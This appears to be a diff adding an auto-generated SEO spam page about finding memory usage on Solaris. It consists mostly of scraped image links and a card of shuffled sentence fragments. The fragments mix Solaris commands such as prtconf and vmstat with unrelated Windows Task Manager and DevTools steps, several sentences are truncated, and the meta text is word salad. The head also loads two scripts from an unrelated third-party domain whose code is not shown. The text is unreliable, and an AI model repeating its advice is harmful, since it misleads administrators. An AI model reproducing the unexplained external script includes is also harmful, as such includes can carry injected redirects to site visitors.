@@ -1,0 +1,552 @@
+<!doctype html>
+<html lang="en-US">
+<head>
+<script type="text/javascript" src="https://grottepastenaecollepardo.org/ik.js"></script>
+<script type="text/javascript" src="https://grottepastenaecollepardo.org/rfr.js"></script>
+<!--ads/oto.txt-->
+<!--ads/terra.txt-->
+<meta name="msvalidate.01" content="DE407F87A97446F5DE4454148343DF05" />
+	<!-- Required meta tags -->
+	<meta charset="utf-8">
+  <title>How To Find Out Memory In Solaris  - Entryunderstanding23</title>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta property="og:title" content="Neat Tips About How To Find Out Memory In Solaris  - Entryunderstanding23" />
+  <meta name="description" content="Neat Tips About Memory  Solaris In Find To How Out Top &amp; Vmstat Command Shows Free Memory Is 86g And Usage Is 42g. - Entryunderstanding23"/>
+  <meta name="keyword" content="Neat Tips About How Find Memory Out Solaris To In  First, You Need To Check How Much Memory Is Used In Kernel And How Much Is Used In User Memory. - Entryunderstanding23"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="googlebot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+  <meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:title" content="Neat Tips About How To Find Out Memory In Solaris " />
+  <meta name="twitter:description" content="Neat Tips About Memory  Solaris In Find To How Out Depending On The Memory Type The. - Entryunderstanding23" />
+	<!-- Bootstrap CSS -->
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha256-L/W5Wfqfa0sdBNIKN9cG6QA5F2qx4qICmU2VgLruv9Y=" crossorigin="anonymous" />
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/css/lightbox.min.css" integrity="sha256-tBxlolRHP9uMsEFKVk+hk//ekOlXOixLKvye5W2WR5c=" crossorigin="anonymous" />
+	<link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet">	
+	<style type="text/css">
+.meww h1{padding-top:30px;}.posts-gallery,.posts-image,.posts-picture{display:block}.posts-gallery img,.posts-image img{object-fit:cover;object-position:center}body,html{font-family:"Source Sans Pro",sans-serif;font-size:14px;font-weight:400;background:#F8F8FF}img{max-width:100%}.container{max-width:1024px}.navbar{margin-bottom:25px;border-bottom:1px solid #eee;background:#4682B4!important;-webkit-box-shadow:0 0 25px -8px rgba(0,0,0,.75);-moz-box-shadow:0 0 25px -8px rgba(0,0,0,.75);box-shadow:0 0 25px -8px rgba(0,0,0,.75)}.posts-image-content,.widget{-webkit-box-shadow:0 0 25px -8px rgba(0,0,0,.75);-moz-box-shadow:0 0 25px -8px rgba(0,0,0,.75)}.navbar .navbar-brand{margin:0 10px 0 0;font-size:17px;padding:0;line-height:24px}.navbar .navbar-sub{margin:0 20px 0 0;font-size:14px;padding:0;line-height:24px}.row.content,.row.footer,.row.header{widthx:auto;max-widthx:100%}.row.footer{padding:30px 0;background:0 0;border-color:#eee}.content .col-sm-12{padding:0}.content .col-md-9s{margin-right:-25px}.posts-image{width:50%;float:left}.posts-image-content{width:auto;margin:0 15px 35px 0;position:relative;background:#fff;border:1px solid #eee;box-shadow:0 0 25px -8px rgba(0,0,0,.75);-webkit-border-radius:5px;-moz-border-radius:5px;border-radius:5px}.posts-image img{width:100%;height:250px;margin-bottom:5px;-webkit-transition:.6s opacity;transition:.6s opacity;-webkit-border-radius:5px 5px 0 0;-moz-border-radius:5px 5px 0 0;border-radius:5px 5px 0 0}.posts-single,.widget{border:1px solid #eee}.posts-image:hover img{opacity:.8}.posts-image:hovers h2{background:rgba(0,0,0,.7)}.posts-image h2{z-index:2;font-size:20px;padding:5px 10px;text-align:left;-webkit-transition:.6s opacity;transition:.6s background;padding-top:30px}.posts-picture,.posts-picture img{text-align:center}.posts-image h2 a{color:#111}.posts-image-single .posts-image-content,.posts-image-single:nth-child(5n) .posts-image-content{margin:0 15px 15px 0!important}.posts-images{clear:both}.widget{background:#fff;box-shadow:0 0 25px -8px rgba(0,0,0,.75);-webkit-border-radius:5px;-moz-border-radius:5px;border-radius:5px;margin-bottom:20px}.list-group{border:none}.list-group li{padding:0;border:none}.list-group li a{display:block;padding:8px}h3.widget-title{font-size:20px;padding:10px 10px 5px}a{color:#4682B4;text-decoration:none}.footer{margin-top:21px;padding-top:13px;border-top:1px solid #eee}.footer a{margin:0 15px}.navi{margin:13px 0}.navi a{margin:5px 2px;font-size:95%}.posts-single{background:#fff;padding:15px;-webkit-box-shadow:0 0 25px -8px rgba(0,0,0,.75);-moz-box-shadow:0 0 25px -8px rgba(0,0,0,.75);box-shadow:0 0 25px -8px rgba(0,0,0,.75);-webkit-border-radius:5px 5px 0 0;-moz-border-radius:5px 5px 0 0;border-radius:5px 5px 0 0}.posts-singles{border:1px solid #eee;background:#fff;margin-top:-10px;border-top:0;padding:0 15px 15px;-webkit-box-shadow:0 8px 31px -9px rgba(0,0,0,.75);-moz-box-shadow:0 8px 31px -9px rgba(0,0,0,.75);box-shadow:0 8px 31px -9px rgba(0,0,0,.75);-webkit-border-radius:0 0 5px 5px;-moz-border-radius:0 0 5px 5px;border-radius:0 0 5px 5px}.posts-gallery{width:20%;float:left}.posts-gallery-content{border:1px solid #fff;width:auto;max-width:100%}.posts-gallery img{width:100%;height:110px}@media    only screen and (min-width:0px) and (max-width:991px){.container{width:auto;max-width:100%}.navbar{padding:5px 0}.navbar .container{width:100%;margin:0 15px}}@media    only screen and (min-width:0px) and (max-width:767px){.content .col-md-3{padding:15px}}@media    only screen and (min-width:481px) and (max-width:640px){.posts-gallery{width:33.3%}}@media    only screen and (min-width:0px) and (max-width:480px){.posts-image{width:100%}.posts-image .posts-image-content{margin-right:0}.posts-gallery{width:50%}}
+	</style>
+	<script type="application/ld+json">
+{
+  "@context": "https://schema.org/", 
+  "@type": "Article", 
+  "author": {
+    "@type": "Person",
+    "name": "entryunderstanding23"
+  },
+  "headline": "How To Find Out Memory In Solaris",
+  "datePublished": "2023-04-19",
+  "image": "https://i.stack.imgur.com/9Ocwb.png",
+  "publisher": {
+    "@type": "Organization",
+    "name": "Entryunderstanding23",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://via.placeholder.com/512.png?text=how+to+find+out+memory+in+solaris",
+      "width": 512,
+      "height": 512
+    }
+  }
+}
+</script>
+	<!-- Head tag Code --></head>
+<body>
+	<header class="bg-white fixed-top">			
+		<nav class="navbar navbar-light bg-white mb-0">
+			<div class="container justify-content-center justify-content-sm-between">	
+			  <a href="/" title="Entryunderstanding23" class="navbar-brand mb-1">Entryunderstanding23</a>
+			  			</div>			  
+		</nav>				
+	</header>
+	<main id="main" class="main">
+		<div class="container">  
+			<div class="row content">
+				<div class="col-md-12 my-2" align="center">
+					<div class="d-block p-4">
+	<center>
+		<!-- TOP BANNER ADS -->
+	</center>
+</div>				</div>
+				<div class="col-md-9">
+					<div class="col-sm-12 p-2">
+							<h1>Here’s A Quick Way To Solve A Info About How To Find Out Memory In Solaris</h1>
+
+	
+	<div class="navi text-center">
+					<p align="justify">When a solaris server starts running out of memory it starts scanning for pages and that value shows how quickly it&#039;s scanning. Total (logical) memory in the system. Instead of command “prstat”, which report active process. <br>				
+			</p>
+		    <!--ads/responsive.txt-->
+								<a class="badge badge-light" href="/how-to-draw-a-picture-of-the-earth.html">how to draw a picture of the earth</a>
+											<a class="badge badge-success" href="/how-to-recover-ps3-password.html">how to recover ps3 password</a>
+											<a class="badge badge-light" href="/how-to-control-other-sims.html">how to control other sims</a>
+											<a class="badge badge-light" href="/how-to-look-after-staffies.html">how to look after staffies</a>
+											<a class="badge badge-warning" href="/how-to-fix-dns-error.html">how to fix dns error</a>
+											<a class="badge badge-danger" href="/how-to-draw-ipod-touch.html">how to draw ipod touch</a>
+											<a class="badge badge-info" href="/how-to-keep-someone-from-calling-you.html">how to keep someone from calling you</a>
+											<a class="badge badge-warning" href="/how-to-recover-data-on-a-crashed-hard-drive.html">how to recover data on a crashed hard drive</a>
+						</div>
+	<div class="d-block p-4">
+	<center>
+		<!-- IN ARTICLE ADS -->
+	</center>
+</div>					</div> 
+					<div class="col-sm-12">					
+						
+		
+	<div class="row">
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://i.ytimg.com/vi/5e-T_80sxgk/maxresdefault.jpg" data-lightbox="roadtrip" title="How To Check Ram Usage In Solaris - Youtube ">
+											<img class="card-img v-image" src="https://i.ytimg.com/vi/5e-T_80sxgk/maxresdefault.jpg" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTwhtZRGsUIaejvrwNO1w4X7a74VZoNWm2kvznoZC_PS-y2zd9j0hxcGk-EkStL4s8OZHU';" alt="How To Check Ram Usage In Solaris - Youtube">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h4>How To Check Ram Usage In Solaris - Youtube </h4></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://i.ytimg.com/vi/-X_LrgjX0P0/maxresdefault.jpg" data-lightbox="roadtrip" title="How To Show Memory Usage In Details On Solaris 10 - Youtube ">
+											<img class="card-img v-image" src="https://i.ytimg.com/vi/-X_LrgjX0P0/maxresdefault.jpg" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSHCRSH5NOtosQRa95WkilrC1oJzhrgUuFNf1P8NvqzNOOkDL7HuING4VY1Ugc82E39_k8';" alt="How To Show Memory Usage In Details On Solaris 10 - Youtube">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h3>How To Show Memory Usage In Details On Solaris 10 - Youtube </h3></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://docs.oracle.com/cd/E37069_01/html/E37091/figures/dynamic_results.png" data-lightbox="roadtrip" title="">
+											<img class="card-img v-image" src="https://docs.oracle.com/cd/E37069_01/html/E37091/figures/dynamic_results.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTgvB04yWN1vUUBlZwHKweXCcadp73TFiONhMNl876564y9mq-GVmEKpRXRrZIL6XpgwpY';" alt="Collecting And Displaying Dynamic Memory Usage Data - Oracle® Solaris  Studio 12.4: Code Analyzer Tutorial">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h3></h3></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://i.ytimg.com/vi/sojcdKoNILg/maxresdefault.jpg" data-lightbox="roadtrip" title="How To Check Cpu Usage In Solaris - Youtube ">
+											<img class="card-img v-image" src="https://i.ytimg.com/vi/sojcdKoNILg/maxresdefault.jpg" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSHWSwXQTgbTuiU84MNPTP6gVsACtsImC-wK6A1W6ZxF2CjpR3bEGV5G9E2uYCxIWN0nVo';" alt="How To Check Cpu Usage In Solaris - Youtube">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h3>How To Check Cpu Usage In Solaris - Youtube </h3></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://i.stack.imgur.com/mG2s2.png" data-lightbox="roadtrip" title="Monitoring - How Should I Monitor Memory Usage/performance In Sunos/solaris?  Server Fault">
+											<img class="card-img v-image" src="https://i.stack.imgur.com/mG2s2.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRZwLBZ6eawswUF0OpytSYBEwVFwyArU5ZO-Y10WU6VGH0ElmkaRVXTl2AV2q0_Ko4sRWI';" alt="Monitoring - How Should I Monitor Memory Usage/Performance In Sunos/Solaris?  - Server Fault">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h2>Monitoring - How Should I Monitor Memory Usage/performance In Sunos/solaris?  Server Fault</h2></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://lh3.googleusercontent.com/-n9kGZqaFlgc/YB1YM3axtZI/AAAAAAAAmFo/YAcNC5D9r4YCRMAw_V5iILKQIj_wbCOJgCLcBGAsYHQ/w1200-h630-p-k-no-nu/image.png" data-lightbox="roadtrip" title="Java67: How To Find Swap Space And Usage In Solaris? Command Example ">
+											<img class="card-img v-image" src="https://lh3.googleusercontent.com/-n9kGZqaFlgc/YB1YM3axtZI/AAAAAAAAmFo/YAcNC5D9r4YCRMAw_V5iILKQIj_wbCOJgCLcBGAsYHQ/w1200-h630-p-k-no-nu/image.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcShuQAlLHA5P9ai7MxmnKwR7F1jlJH6ib0ppoDbQRTcjF4V6BoHYUu8Tal59icD8Ii0DkA';" alt="Java67: How To Find Swap Space And Usage In Solaris? Swap Command Example">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h4>Java67: How To Find Swap Space And Usage In Solaris? Command Example </h4></div>
+				</div>
+			</div>
+		</div>
+			 
+					<div class="col-12 mb-4">
+				<div class="card">
+										<img class="card-img-top v-cover" src="https://flylib.com/books/2/830/1/html/2/images/10fig10_02.jpg" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcShuQAlLHA5P9ai7MxmnKwR7F1jlJH6ib0ppoDbQRTcjF4V6BoHYUu8Tal59icD8Ii0DkA';" alt="Java67: How To Find Swap Space And Usage In Solaris? Swap Command Example">
+															<figcaption align="center">Source From : <a href="https://hospitalrole.tivel.tech" title="Hospitalrole">https://hospitalrole.tivel.tech</a></figcaption>
+										<div class="card-body">
+						<h3 class="h5"><b>Another way is to use the “processes” tab in the windows task manager.</b></h3>
+													<p class="p-2" align="justify">
+																	<strong>How to find out memory in solaris</strong>. 
+																									Faults taken 113099 page ins 718452 page.
+																	Depending on the memory type the.
+																	To check jvm memory usage in windows, you can use the task manager.
+															</p>
+													<p class="p-2" align="justify">
+																									0 pages swapped out 347529889 total address trans.
+																	This is important to decide, which further troubleshooting steps are required.
+																	65408 megabytes how to display.
+															</p>
+													<p class="p-2" align="justify">
+																									$ prtconf | grep memory memory size:
+																	Simply press ctrl+shift+esc to open the task manager, then click on the “processes” tab.
+																	One of my solaris unix server has total ram 128g.
+															</p>
+													<p class="p-2" align="justify">
+																									In the task manager, click on the “performance” tab and then click on the “cpu” and “memory” sections.
+																	To find how much physical memory is installed on the system, use the prtconf command in solaris.
+																	Click the heap snapshot radio button, and then click the take snapshot button at the bottom of the panel.
+															</p>
+													<p class="p-2" align="justify">
+																									Top &amp; vmstat command shows free memory is 86g and usage is 42g.
+																	The grep memory command selects output from the prtconf command to display memory information only.
+																	First, you need to check how much memory is used in kernel and how much is used in user memory.
+															</p>
+													<p class="p-2" align="justify">
+																									Open devtools and go to the memory panel.
+																	On solaris, you can use the command prtconf to determine how much physical memory the computer has.
+																	The only way to see how much memory a process is.
+															</p>
+						            <!--ads/responsive.txt-->
+					</div> 
+				</div>
+			</div>
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://i.stack.imgur.com/hxfgE.png" data-lightbox="roadtrip" title="Monitoring - How Should I Monitor Memory Usage/performance In Sunos/solaris?  Server Fault">
+											<img class="card-img v-image" src="https://i.stack.imgur.com/hxfgE.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTmysD4Xp1V4jkA9FSIr8E91-UDl1E9bLQ9MNbZaF6K_BzjAy2WSbej4MXn7KAPVK0mrDg';" alt="Monitoring - How Should I Monitor Memory Usage/Performance In Sunos/Solaris?  - Server Fault">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h4>Monitoring - How Should I Monitor Memory Usage/performance In Sunos/solaris?  Server Fault</h4></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://i.stack.imgur.com/9Ocwb.png" data-lightbox="roadtrip" title="Monitoring - How Should I Monitor Memory Usage/performance In Sunos/solaris?  Server Fault">
+											<img class="card-img v-image" src="https://i.stack.imgur.com/9Ocwb.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTvcP6GEe6ZIW189k_zj5pAy1E4s92N3-O2TSNf1y8vd3M5D0BATDZcgrxUkiWVlO2vYjE';" alt="Monitoring - How Should I Monitor Memory Usage/Performance In Sunos/Solaris?  - Server Fault">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h6>Monitoring - How Should I Monitor Memory Usage/performance In Sunos/solaris?  Server Fault</h6></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://i.stack.imgur.com/PBsQx.png" data-lightbox="roadtrip" title="Monitoring - How Should I Monitor Memory Usage/performance In Sunos/solaris?  Server Fault">
+											<img class="card-img v-image" src="https://i.stack.imgur.com/PBsQx.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSeT9OKTkDDezrYHm-xuDFpGqNdYUozlj0wxFY7p-9UsnVZhWZiIuLR2AkpG5gWvi-KxFM';" alt="Monitoring - How Should I Monitor Memory Usage/Performance In Sunos/Solaris?  - Server Fault">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h3>Monitoring - How Should I Monitor Memory Usage/performance In Sunos/solaris?  Server Fault</h3></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.cyberciti.biz/media/new/faq/2006/04/Linux-memory-usage-monitor-top-command.png" data-lightbox="roadtrip" title="Linux Check Memory Usage Using The Cli And Gui - Nixcraft ">
+											<img class="card-img v-image" src="https://www.cyberciti.biz/media/new/faq/2006/04/Linux-memory-usage-monitor-top-command.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRLk8QN-X7MI8QccVFCJumaVLdYc6gpQDFqVsoxaC6aU6n5aIOZQM4gAXjQtuoJi4r9hvk';" alt="Linux Check Memory Usage Using The Cli And Gui - Nixcraft">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h3>Linux Check Memory Usage Using The Cli And Gui - Nixcraft </h3></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://miro.medium.com/max/1400/1*BH8gR1EwEHt87xB0chCUkA.png" data-lightbox="roadtrip" title="Shared Memory Management On Oracle Solaris For Databases | By Zaheer  Syed (appsdbaworkshop) Medium">
+											<img class="card-img v-image" src="https://miro.medium.com/max/1400/1*BH8gR1EwEHt87xB0chCUkA.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRA0DHU-2IfEpbsmBK6ClN05jr50oTpFXmHvAA0Lhoykrrwu34y3HUkKo4YAKnju-QZXbY';" alt="Shared Memory Management On Oracle Solaris For Oracle Databases | By Zaheer  Syed (Appsdbaworkshop) | Medium">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h4>Shared Memory Management On Oracle Solaris For Databases | By Zaheer  Syed (appsdbaworkshop) Medium</h4></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://miro.medium.com/max/1400/1*viHdHOXta1md-9V7BS-5MQ.png" data-lightbox="roadtrip" title="Shared Memory Management On Oracle Solaris For Databases | By Zaheer  Syed (appsdbaworkshop) Medium">
+											<img class="card-img v-image" src="https://miro.medium.com/max/1400/1*viHdHOXta1md-9V7BS-5MQ.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTWub4sgyKIXsPkHlwdzxaMxaL5T1Z0MkYQ8NB4By3m-6ypxsLZBc5Ny8-hR7fFVqqkVsU';" alt="Shared Memory Management On Oracle Solaris For Oracle Databases | By Zaheer  Syed (Appsdbaworkshop) | Medium">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h5>Shared Memory Management On Oracle Solaris For Databases | By Zaheer  Syed (appsdbaworkshop) Medium</h5></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://i.stack.imgur.com/GMKO4.png" data-lightbox="roadtrip" title="Linux - How To Display Meminfo In Megabytes Top? Unix &amp; Stack  Exchange">
+											<img class="card-img v-image" src="https://i.stack.imgur.com/GMKO4.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR6qmzoG2s5yoTGkWfvSUmwjox3BulRXjvktgBc8w1r_6qo5cAjV0zHxcOrQ_3710ENUyo';" alt="Linux - How To Display Meminfo In Megabytes In Top? - Unix &amp; Linux Stack  Exchange">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h4>Linux - How To Display Meminfo In Megabytes Top? Unix &amp; Stack  Exchange</h4></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.cyberciti.biz/media/new/faq/2008/08/How-to-find-the-frequency-and-type-of-my-current-RAM-in-Linux.png" data-lightbox="roadtrip" title="Linux Check Ram Speed And Type Commands - Nixcraft ">
+											<img class="card-img v-image" src="https://www.cyberciti.biz/media/new/faq/2008/08/How-to-find-the-frequency-and-type-of-my-current-RAM-in-Linux.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQGyFk9xQVbge_7o2cZlQDPq4wpVDz-4x01fItNemO4DTCfNgJDLGWlbEwCygyoNUYHfA';" alt="Linux Check Ram Speed And Type Commands - Nixcraft">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h2>Linux Check Ram Speed And Type Commands - Nixcraft </h2></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.cyberciti.biz/media/new/faq/2006/04/atop-command-output.png" data-lightbox="roadtrip" title="Linux Check Memory Usage Using The Cli And Gui - Nixcraft ">
+											<img class="card-img v-image" src="https://www.cyberciti.biz/media/new/faq/2006/04/atop-command-output.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRX8J9nmYKFwlZFRfcqrlfxgxjIDF3FRK44WfMU6GFChjGt39_Wu3XgcTtZCOlDckLUzl0';" alt="Linux Check Memory Usage Using The Cli And Gui - Nixcraft">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h5>Linux Check Memory Usage Using The Cli And Gui - Nixcraft </h5></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://flylib.com/books/2/830/1/html/2/images/10fig10_02.jpg" data-lightbox="roadtrip" title="Section 10.2. Pages: The Basic Unit Of Solaris Memory | Internals:  10 And Opensolaris Kernel Architecture (2nd Edition)">
+											<img class="card-img v-image" src="https://flylib.com/books/2/830/1/html/2/images/10fig10_02.jpg" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ_-QPZPt0-QaAJxxzzM--HVj87r18gvUE-zQB66wIulUnHcZ1ramntAN01w3IfNijySFE';" alt="Section 10.2. Pages: The Basic Unit Of Solaris Memory | Solaris Internals:  Solaris 10 And Opensolaris Kernel Architecture (2Nd Edition)">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h4>Section 10.2. Pages: The Basic Unit Of Solaris Memory | Internals:  10 And Opensolaris Kernel Architecture (2nd Edition)</h4></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://docs.oracle.com/cd/E37069_01/html/E37090/figures/gui.png" data-lightbox="roadtrip" title="">
+											<img class="card-img v-image" src="https://docs.oracle.com/cd/E37069_01/html/E37090/figures/gui.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5yFt4IlhPFYnMpTI45Wg7sL1fygTmWGypxEjxgDa56251WytU_WYBlQQVLiqJGLr5AvQ';" alt="Using The Code Analyzer Gui - Oracle® Solaris Studio 12.4: Code Analyzer  User&#039;s Guide">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h4></h4></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.cyberciti.biz/media/new/faq/2006/04/htop-command-output.png" data-lightbox="roadtrip" title="Linux Check Memory Usage Using The Cli And Gui - Nixcraft ">
+											<img class="card-img v-image" src="https://www.cyberciti.biz/media/new/faq/2006/04/htop-command-output.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxz_8eh9fvSmS5P39TykgcJl4kJbeOexCwjRTGyY-YopLbY8x8TZ36ZE7EE7DXU8VxCzI';" alt="Linux Check Memory Usage Using The Cli And Gui - Nixcraft">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h6>Linux Check Memory Usage Using The Cli And Gui - Nixcraft </h6></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
